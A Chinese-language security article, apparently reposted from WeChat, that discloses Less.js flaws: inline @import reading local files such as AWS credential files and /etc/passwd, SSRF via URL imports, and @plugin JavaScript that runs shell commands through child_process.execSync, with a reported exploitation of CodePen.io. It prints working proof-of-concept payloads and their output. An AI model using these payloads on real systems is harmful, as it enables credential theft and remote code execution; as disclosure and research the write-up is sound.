> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PVgOU22JX4xTigL1HdbApg)

![](https://mmbiz.qpic.cn/mmbiz_png/OhKLyqyFoP9mJwX65uY3o0wwuMo2eWPeFuDIhxJlAjMcIicKFSYLVZ6fjicY0dNle24gfmiaVpwCcP2PeZuZyaRzw/640?wx_fmt=png)点击上方蓝字关注我们

Less(less.js) 是一种流行的预处理器语言，可转换为有效的 CSS 代码。它提供的功能有助于简化网站 CSS 的编写。研究人员在 Less.js 中发现了一个漏洞，攻击者可以利用该漏洞针对允许用户输入 Less.js 代码的网站实现远程代码执行 (RCE)。

漏洞详情


--------

第一个漏洞存在于 Less.js 的增强导入功能中，它包含不解释请求内容的内联模式。这可用于请求本地或远程文本内容，并在生成的 CSS 中返回。

此外，Less 处理器在其 @import 语句中无限制地接受 URL 和本地文件引用。当在服务器端处理 Less 代码时，这可用于 SSRF 和本地文件泄露。

**本地文件泄漏 PoC**

**1.** 创建一个 Less 文件：

```
// File: bad.less
@import (inline) "../../.aws/credentials";
```

**2.** 针对创建的 less 文件启动 lessc 命令：

```
lessc bad.less
```

**3.** 输出中包含引用的文件

```
Lessjs $ .\node_modules\.bin\lessc .\bad.less
[default]
  aws_access_key_id=[MASKED]
  aws_secret_access_key=[MASKED]
```

##### **SSRF PoC**

**1.** 在本地主机上启动 Web 服务器，以提供 Hello World 消息

**2.** 创建一个 Less 文件：

```
// File: bad.less
@import (inline) "http://localhost/";
```

**3.** 针对创建的 less 文件启动 lessc 命令，并注意输出包含引用的外部内容

```
Lessjs $ .\node_modules\.bin\lessc .\bad.less
Hello World
```

利用 Less 插件功能


----------------

Less.js 库支持插件，这些插件可以使用 @plugin 语法直接包含在远程的 Less 代码中。插件使用 JavaScript 编写，当 Less 代码被解释时，任何包含的插件都会执行。这可能会导致两种结果，具体取决于 Less 处理器的上下文。如果在客户端处理 Less 代码，则会导致跨站脚本攻击。如果在服务器端处理 Less 代码，则会导致远程代码执行。所有支持 @plugin 语法的 Less 版本都容易受到攻击。

以下两个代码段为 Less.js 插件示例：

版本 2：

```
// plugin-2.7.js
functions.add('cmd', function(val) {
  return val;
});
```

版本 3 及更高版本：

```
// plugin-3.11.js
module.exports = {
  install: function(less, pluginManager, functions) {
    functions.add('cmd', function(val) {
      return val;
    });
  }
};
```

这两个版本，都可以通过以下方式包含在 Less 代码中，甚至可以从远程主机获取：

```
// example local plugin usage
@plugin "plugin-2.7.js";
```

```
// example remote plugin usage
@plugin "http://example.com/plugin-2.7.js"
```

以下代码段显示了如何进行 XSS 攻击：

```
window.alert('xss')
functions.add('cmd', function(val) {
  return val;
});
```

以下插件片段 (v2.7.3) 展示了攻击者如何实现远程代码执行 (RCE)：

```
functions.add('cmd', function(val) {
  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
});
```

以及包含插件的恶意 less：

```
@plugin "plugin.js";

body {
color: cmd('whoami');
}
```

请注意使用 lessc 转译 less 代码时的输出：

![](https://mmbiz.qpic.cn/mmbiz_png/DQk5QiaQiciakaz0IQibwTRzD6ROzrQOyt5qgs4Lia3Cb2dvxneXg616V9ITY7HA4qapR6E268nANWET4VNTvicQpREw/640?wx_fmt=png)

以下是 3.13.1 版本的等效 PoC 插件：  

```
//Vulnerable plugin (3.13.1)
registerPlugin({
    install: function(less, pluginManager, functions) {
        functions.add('cmd', function(val) {
            return global.process.mainModule.require('child_process').execSync(val.value).toString();
        });
    }
})
```

所有版本的恶意 Less 代码都是相同的。所有支持插件的 Lessjs 版本都可以使用上面的 poc 进行攻击。

真实示例：CodePen.io


-------------------

CodePen.io 是一个用于创建 Web 代码片段流行网站，它支持标准语言和其他语言，如 Less.js。研究人员在该网站上尝试了上诉 PoC，并能够泄露他们的 AWS 密钥，以及在 AWS Lambda 中运行任意命令。

以下显示了如何使用包含漏洞的本地文件读取环境值：

```
/ import local file PoC
import (inline) "/etc/passwd";
```

```
<style type="text/css" class="INLINE_PEN_STYLESHEET_ID">root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
...snip...
ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
rngd:x:996:994:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
slicer:x:995:992::/tmp:/sbin/nologin
sb_logger:x:994:991::/tmp:/sbin/nologin
sbx_user1051:x:993:990::/home/sbx_user1051:/sbin/nologin
sbx_user1052:x:992:989::/home/sbx_user1052:/sbin/nologin
...snip...
</style>
```

以下屏幕截图显示了如何使用 Less 插件功能来实现 RCE：

![](https://mmbiz.qpic.cn/mmbiz_png/DQk5QiaQiciakaz0IQibwTRzD6ROzrQOyt5qrO0VAb7swhwTRpHRxeaiaSUOzXgiaOn4o9TZC6XL04okTHgryR1zKIxg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RQoDdorCu0V5znWFiaMBVWiaibdvAvmGeUvfC5LJ60x1Kq5wiaQ5UtMKEDcwQJ3ibicBdGBKxGs1V2AuZcg3ISoDto1g/640?wx_fmt=png)

  

END

  

![](https://mmbiz.qpic.cn/mmbiz_png/DQk5QiaQiciakarCFnYafgYGpNRiaX2oibtiawYX92ytrKp9MpmQeOqARcreRBybBX1fDbv2guZxExicn7f0wn2dkVwqw/640?wx_fmt=png)

好文！必须在看